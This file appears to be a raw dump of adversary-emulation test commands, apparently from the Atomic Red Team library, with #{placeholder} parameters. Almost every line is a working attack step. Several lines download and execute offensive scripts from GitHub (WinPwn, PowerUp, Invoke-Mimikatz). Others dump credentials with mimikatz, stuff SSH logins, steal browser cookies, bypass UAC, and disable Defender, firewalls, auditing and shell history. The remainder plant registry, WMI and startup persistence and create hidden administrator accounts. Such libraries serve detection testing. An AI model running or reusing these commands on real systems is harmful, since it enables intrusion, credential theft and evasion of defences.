$key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\";$name ="bad-subdomain";new-item $key -Name $name -Force;new-itemproperty $key$name -Name https -Value 2 -Type DWORD;;new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;;new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;
chmod -R #{numeric_mode} #{file_or_folder}
pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'
cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/&&for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}
nltest.exe /dclist:#{target_domain}
netsh advfirewall set currentprofile state off
ufw disable
get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL;get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 0 /f
wscript.exe "#{vbscript_file}"
ENCODED=$(echo '#{message}' | base64)&&printf $ENCODED | base64 -d&&echo $ENCODED | base64 -d&&echo $(echo $ENCODED) | base64 -d&&echo $ENCODED > #{encoded_file} && base64 -d #{encoded_file}&&echo $ENCODED > #{encoded_file} && base64 -d < #{encoded_file}&&echo $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d&&echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d&&bash -c "{echo,\"$(echo $ENCODED)\"}|{base64,-d}"
xattr -lr * / 2>&1 /dev/null | grep -C 2 "00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00"
Enable-PSRemoting -Force;Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}
sudo #{exe_path}&&kextstat 2>/dev/null | grep SoftRAID&&sudo kextunload /Library/Extensions/SoftRAID.kext
Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand';$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand';Invoke-Expression $streamcommand
net group "Domain Computers" /domain
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force;New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force;Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force;Start-Process "C:\Windows\System32\fodhelper.exe"
"#{file_path}"
rm #{history_path}
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');inv-phantom -consoleoutput -noninteractive  
cp #{calc_plist_path} ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
Start-Process -Wait -FilePath "#{UltraViewer_Path}" -Argument "/silent" -PassThru;Start-Process 'C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe'
mkdir /var/tmp/.hidden-directory&&echo "T1564.001" > /var/tmp/.hidden-directory/.hidden-file
SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
touch -acmr #{reference_file_path} #{target_file_path}
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop
echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
sysadminctl -deleteUser #{user_account} #enter admin password
Set-MpPreference -drtm $True;Set-MpPreference -dbm $True;Set-MpPreference -dscrptsc $True;Set-MpPreference -dbaf $True
Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');Morerecon -noninteractive -consoleoutput
Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{};if(#{delete_defender_folder}){;  $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse;  Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{};}
cd #{folder_path}; split -b 5000000 #{file_name}&&ls -l #{folder_path}
Start-Process #{powershell_command}
netstat&&who -a
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\T1654_events.txt}
export AWS_REGION=#{aws_region} &&cd #{stratus_path}&&echo "starting warmup"&&./stratus warmup aws.defense-evasion.vpc-remove-flow-logs&&echo "starting detonate"&&./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force
cmd.exe /c "net use \\#{computer_name}\#{share_name} #{password} /u:#{user_name}"
if [ "$(uname)" = 'FreeBSD' ]; then cmd="netstat -Sp tcp"; else cmd="netstat -ant"; fi;&&if [ -x "$(command -v arp)" ]; then arp -a; else echo "arp is missing from the machine. skipping..."; fi;&&if [ -x "$(command -v ifconfig)" ]; then ifconfig; else echo "ifconfig is missing from the machine. skipping..."; fi;&&if [ -x "$(command -v ip)" ]; then ip addr; else echo "ip is missing from the machine. skipping..."; fi;&&if [ -x "$(command -v netstat)" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo "netstat is missing from the machine. skipping..."; fi;
wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
pw useradd #{username} -g 0 -d /root -s /bin/sh&&echo "#{password}" | pw usermod #{username} -h 0
sh #{script_path}&&PID=$(pgrep -n -f "#{pid_term}")&&HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)&&MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))&&MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))&&MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))&&dd if=/proc/"${PID}"/mem of="#{output_file}" ibs=1 skip="$MEM_START" count="$MEM_SIZE"&&grep -i "PASS" "#{output_file}"
fltmc.exe | findstr.exe 385201
echo '#{command_to_add}' >> ~/.bashrc
Connect-AzureAD;$userprincipalname = "#{userprincipalname}";$username = "#{username}"      ;$password = "#{password}";$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile;$PasswordProfile.Password = $password;New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username      
net user #{guest_user} /active:yes;net user #{guest_user} #{guest_password};net localgroup #{local_admin_group} #{guest_user} /add;net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /add;reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f;reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f;reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f;fodhelper.exe
#{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"
sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname
which_python=`which python || which python3`&&$which_python -c "import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();"
sudo touch #{file_to_setuid}&&sudo chown root #{file_to_setuid}&&sudo chmod u+xs #{file_to_setuid}
kubectl get cronjobs -n #{namespace}
hh.exe #{remote_chm_file}
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes;netsh advfirewall firewall set rule group="file and printer sharing" new enable=Yes
echo '#{text_to_append}' >> ~/.profile
Get-Service WinDefend #check the service state of Windows Defender;Get-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc;Get-MpThreat #threats details that have been detected using MS Defender
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing);Invoke-AllChecks
if ((${#HISTIGNORE[@]})); then echo "\$HISTIGNORE = $HISTIGNORE"; else export HISTIGNORE='ls*:rm*:ssh*'; echo "\$HISTIGNORE = $HISTIGNORE"; fi&&# -> $HISTIGNORE = ls*:rm*:ssh*&&history -c &&ls -la $HISTFILE&&ls -la ~/.bash_logout&&if [ $(history |wc -l) -eq 1 ]; then echo "ls commands are not in history"; fi&&# -> ls commands are not in history&&unset HISTIGNORE&&&&if ((${#HISTIGNORE[@]})); then echo "\$HISTIGNORE = $HISTIGNORE"; else export HISTIGNORE='*'; echo "\$HISTIGNORE = $HISTIGNORE"; fi&&# -> $HISTIGNORE = *&&history -c &&whoami&&groups&&if [ $(history |wc -l) -eq 0 ]; then echo "History cache is empty"; fi&&# -> History cache is empty
auditpol /set /category:"Account Logon" /success:disable /failure:disable;auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable;auditpol /set /category:"Detailed Tracking" /success:disable
echo '#{command_to_add}' >> ~/.shrc
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode" /VE /T REG_SZ /F /D "Service"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA";IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
net user art-test /add;net user art-test #{password};net localgroup administrators art-test /add
sudo spctl --master-disable
$wdApp = New-Object -COMObject "Word.Application";if(-not $wdApp.path.contains("Program Files (x86)"))  ;{;  Write-Host "64-bit Office";  Copy "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll" "$env:APPDATA\Microsoft\Word\Startup\notepad.wll"        ;};else{;  Write-Host "32-bit Office";  Copy "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll" "$env:APPDATA\Microsoft\Word\Startup\notepad.wll";};Stop-Process -Name "WinWord" ;Start-Process "WinWord"
get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}
aws iam create-user --user-name #{username}
Add-Type -AssemblyName System.IdentityModel  ;setspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
mkdir "\\?\C:\Windows \System32\";copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe";mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties
LD_PRELOAD=#{path_to_shared_library} ls
findstr /S cpassword %logonserver%\sysvol\*.xml
Get-ADComputer #{hostname} -Properties *
net user $ ATOMIC123! /add /active:yes
systemctl stop ufw
stop-process -name "firefox" -force -erroraction silentlycontinue;$CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite";"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c #{sqlite3_path} "$CookieDBLocation" | out-file -filepath "#{output_file}"
hostname
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
"#{uacme_exe}"
sudo smbstatus --shares
cmstp.exe /s "#{inf_file_path}"
sc.exe create #{service_name} binPath= "#{executable_command}";sc sdset #{service_name} "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
shutdown /s /t #{timeout}
Invoke-WebRequest #{pua_url} -OutFile #{pua_file};& "#{pua_file}"
scp #{username}@#{remote_host}:#{remote_file} #{local_path}
for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content }
Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse";Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse";cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse";cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
sudo log -f /var/log/system.log | : > /var/log/system.log
Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1048.003 Atomic Test" -Attachments #{input_file} -SmtpServer #{smtp_server}
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe";extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe;findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe;certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt;makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab;print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe;reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg;regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey;expand \\webdav\folder\file.bat #{path}\file.txt:file.bat;esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o 
$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
sudo -l      &&sudo cat /etc/sudoers&&sudo vim /etc/sudoers
pushd #{destination_path};echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js;CScript.exe AtomicTestT1105.js //E:JScript;del AtomicTestT1105.js /Q >nul 2>&1;del AtomicTestFileT1105.js /Q >nul 2>&1;popd
Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}
reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly;. "#{test_harness}";;$InstallerAssemblyDir = "#{assembly_dir}";$InstallerAssemblyFileName = "#{assembly_filename}";$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName;;$CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`"";$ExpectedOutput = 'Constructor_';;$TestArgs = @{;    OutputAssemblyDirectory = $InstallerAssemblyDir;    OutputAssemblyFileName = $InstallerAssemblyFileName;    InvocationMethod = '#{invocation_method}';    CommandLine = $CommandLine;};;$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly;;if ($ActualOutput -ne $ExpectedOutput) {;    throw @";InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.;Expected: $ExpectedOutput;Actual: $ActualOutput;"@;}
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d "#{redirection_program}" /f
if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;
dir /s /b %USERPROFILE%\Favorites
uname -a >> #{output_file}&&if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi&&if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   &&if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi&&if [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi&&uptime >> #{output_file}&&cat #{output_file} 2>/dev/null
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit");;Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit-backup" -Value "$oldvalue";;$newvalue = $oldvalue + " #{payload}";;Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$newvalue"
touch -a -t 197001010000.00 #{target_filename}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);$macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c #{bat_path} `", vbNormalFocus)`n";Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly;. "#{test_harness}";;$InstallerAssemblyDir = "#{assembly_dir}";$InstallerAssemblyFileName = "#{assembly_filename}";$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName;;$ExpectedOutput = 'Constructor_';;$TestArgs = @{;    OutputAssemblyDirectory = $InstallerAssemblyDir;    OutputAssemblyFileName = $InstallerAssemblyFileName;    InvocationMethod = '#{invocation_method}';};;$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly;;if ($ActualOutput -ne $ExpectedOutput) {;    throw @";CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.;Expected: $ExpectedOutput;Actual: $ActualOutput;"@;}
cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/&&for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';;                EventNameSpace='root\CimV2';;                QueryLanguage="WQL";;                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};;$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs;;$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';;                CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";};$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs;;$FilterToConsumerArgs = @{;Filter = [Ref] $Filter;;Consumer = [Ref] $Consumer;;};$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
#{dspath} -S #{txt_payload} 
$excelApp = New-Object -COMObject "Excel.Application";if(-not $excelApp.path.contains("Program Files (x86)")){;    Write-Host "64-bit Office";    $excelApp.RegisterXLL("PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll");};else{;  Write-Host "32-bit Office";  $excelApp.RegisterXLL("PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll");}
swapon -a &&sleep 2&&swapoff -a&&sync
$PathToAtomicsFolder\T1055\bin\x64\EtwpCreateEtwThread.exe -debug
import-module "PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1";Invoke-MSOLSpray -UserList "#{user_list}" -Password "#{password}"
sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
Invoke-Expression "#{input_file}"
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library "#{source_file}";C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n";Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
set -x&&sudo kextload #{module_path}&&kextstat 2>/dev/null | grep SoftRAID&&sudo kextunload #{module_path}&&sudo kmutil load -p #{module_path}&&kextstat 2>/dev/null | grep SoftRAID&&sudo kmutil unload -p #{module_path}
cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12;Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;;[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);;cmd /c "timeout #{recording_time} > NULL && psr.exe /stop"
dsenableroot #current user&&dsenableroot -u art-tester -p art-tester -r art-root #new user
$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1];$pieces = $localip.split(".");$firstOctet = $pieces[0];$secondOctet = $pieces[1];$thirdOctet = $pieces[2];foreach ($ip in 1..255 | % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip}
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile #{output_file}
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}';New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value "#{dllpath}";New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String";Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
mkdir $PathToAtomicsFolder\T1560.001\victim-files;cd $PathToAtomicsFolder\T1560.001\victim-files;echo "This file will be encrypted" > .\encrypted_file.txt;"#{7zip_exe}" u archive.7z *txt -pblue;dir
"c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
df -aH&&smbutil view -g //#{computer_name}&&showmount #{computer_name}
[System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt ;$env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append
Get-AdGroup -Filter *
del %TEMP%\PrintBrm.zip >nul 2>&1 ;#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\PrintBrm.zip -O FORCE
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers&&sudo visudo -c -f /usr/local/etc/sudoers
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');browserpwn -consoleoutput -noninteractive
New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null;Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}
sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
"#{vboxmanage_exe}" createvm --name "#{vm_name}" --register;"#{vboxmanage_exe}" modifyvm "#{vm_name}" --firmware efi;"#{vboxmanage_exe}" startvm "#{vm_name}"
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1');Invoke-SharpUp -command "audit"
$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)");$DirectorySearcher.PropertiesToLoad.Add("Name");$Computers = $DirectorySearcher.findall();foreach ($Computer in $Computers) {;  $Computer = $Computer.Properties.name;  if (!$Computer) { Continue };  Write-Host $Computer}
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
chmod -R #{symbolic_mode} #{file_or_folder}
#{msi_exe} /q /#{action} "#{msi_payload}"
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique DiskCleanup
wmic process get /format:list
echo #{bash_encoded} | base64 -d | bash&&echo #{dash_encoded} | base64 -d | bash&&echo #{fish_encoded} | base64 -d | bash&&echo #{sh_encoded} | base64 -d | bash
New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 1
